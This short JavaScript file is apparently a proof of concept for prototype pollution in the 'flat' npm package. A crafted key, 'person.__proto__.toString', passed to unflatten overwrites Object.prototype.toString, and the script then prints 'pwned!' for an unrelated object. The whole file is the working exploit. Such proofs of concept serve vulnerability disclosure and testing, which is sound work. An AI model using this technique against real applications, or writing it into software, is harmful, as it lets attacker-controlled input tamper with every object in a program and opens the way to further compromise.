const {unflatten} = require('flat');

let person = {name:"Lalo",lastname:"Landa"}

console.log(person.toString())

unflatten({
    'person.__proto__.toString': () => {return 'pwned!'}
});

console.log(person.toString())